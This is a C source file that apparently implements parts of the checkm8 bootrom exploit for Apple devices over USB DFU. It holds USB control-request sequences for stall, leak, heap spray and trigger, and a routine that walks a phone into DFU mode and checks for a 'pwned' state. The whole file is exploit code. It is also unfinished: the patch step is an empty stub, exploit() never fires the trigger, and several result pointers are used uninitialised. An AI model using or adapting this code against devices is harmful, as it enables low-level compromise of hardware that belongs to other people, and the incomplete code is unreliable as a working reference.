#include <exploit/exploit.h>
#include <exploit/payloads/ipwndfu.h>

bool checkm8Reset(device_t *device)
{
    transfer_ret_t transferRet;
    if (sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == DFU_FILE_SUFFIX_LENGTH
    && DFUSetStateWaitReset(&device->handle) == true
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == EP0_MAX_PACKET_SIZE)
    {
        return true;
    }
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return false;
}

bool checkm8Stall(device_t *device)
{
    // 0xC0 bytes of 'A'
    char data[0xC0];
    memset(data, 'A', 0xC0);
    transfer_ret_t *transferRet;
    return sendUSBControlRequestAsync(&device->handle, 0x21, DFU_ABORT, 0x304, 0x40A, &data, 0xC0, 4, transferRet);
}

bool checkm8Leak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC0, transferRet);
}

bool checkm8NoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, transferRet);
}

bool checkm8USBRequestStall(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x2, DFU_GETSTATUS, 0x0, 0x80, 0x0, transferRet);
}

bool checkm8USBRequestLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, transferRet);
}

bool checkm8USBRequestNoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x41, transferRet);
}

// TODO: Handle timeouts correctly for different stages - could use a sendUSBControlRequestWithTimeout() function

void checkm8HeapSpray(device_t *device)
{
    if (config_large_leak > 0)
    {
        checkm8USBRequestStall(device);
        for (int i = 1; i <= config_large_leak; i++)
        {
            checkm8USBRequestLeak(device);
        }
        checkm8USBRequestNoLeak(device);
    }
    else
    {
        checkm8Stall(device);
        for (int i = 1; i <= config_hole; i++)
        {
            checkm8NoLeak(device);
        }
        checkm8USBRequestLeak(device);
        checkm8NoLeak(device);
    }
}

bool checkm8Trigger(device_t *device)
{
    char *data = malloc(0x800);
    memset(data, 'A', 0x800);
    transfer_ret_t *transferRet;
    bool ret = sendUSBControlRequestAsync(&device->handle, 0x21, DFU_DNLOAD, 0, 0, data, 0x800, 1, transferRet);
    free(data);
    ret = sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, transferRet);
    return ret;
}

bool checkm8Patch(device_t *device)
{
    // TODO: Split payload into 0x800 sized chunks, calculate size taking into account size of uint8_t
    return true;
}

int checkm8Done(device_t *device)
{
    return isSerialNumberPwned(getDeviceSerialNumber(&device->handle));
}

int checkm8PrepareDevice(device_t *device) {
    int ret = findDevice(device);
    if (ret == -1)
    {
        return -1;
    }

    if (device->mode == MODE_NORMAL) {
        LOG(LOG_SUCCESS, "Found device in normal mode");
        LOG_NO_NEWLINE(LOG_INFO, "Press enter to place device into recovery mode");
        getchar();
        LOG(LOG_INFO, "Placing device into recovery mode");
        LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
        if (enter_recovery() != 0) {
            LOG(LOG_ERROR, "Failed to place device with udid %s into recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_INFO, "Waiting for device to enter recovery mode");
        if (waitForDeviceInMode(device, MODE_RECOVERY, 20) != 0) {
            LOG(LOG_ERROR, "Device with udid %s failed to enter recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered recovery mode successfully!", device->serialNumber);
    }

    if (device->mode == MODE_RECOVERY) {
        // TODO: DFU helper
        LOG(LOG_INFO, "Please put device into DFU mode manually");
        LOG(LOG_INFO, "Waiting for device to enter DFU mode");
        if (waitForDeviceInMode(device, MODE_DFU, 30) != 0) {
            LOG(LOG_FATAL, "Could not find device in DFU mode after 30 seconds", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered DFU mode successfully!");
    }

    if (isSerialNumberPwned(device->serialNumber) == 0)
    {
        LOG(LOG_ERROR, "Device is already in pwned DFU mode, not performing exploit");
        return 1;
    }
    else
    {
        LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
    }
    return 0;
}

int exploit()
{
    device_t device;
    if (checkm8PrepareDevice(&device) != 0)
    {
        LOG(LOG_FATAL, "Failed to prepare device");
        return -1;
    }

    bool pwned;
    bool waitUSB = waitUSBHandle(&device.handle, &checkm8CheckUSBDevice, &pwned);
    if (waitUSB == false)
    {
        LOG(LOG_FATAL, "Failed to connect to USB device");
        return -1;
    }

    LOG_NO_NEWLINE(LOG_INFO, "Press enter to exploit device");
    getchar();

    LOG(LOG_DEBUG, "Serial number: %s", getDeviceSerialNumber(&device.handle));

    return 0;
}
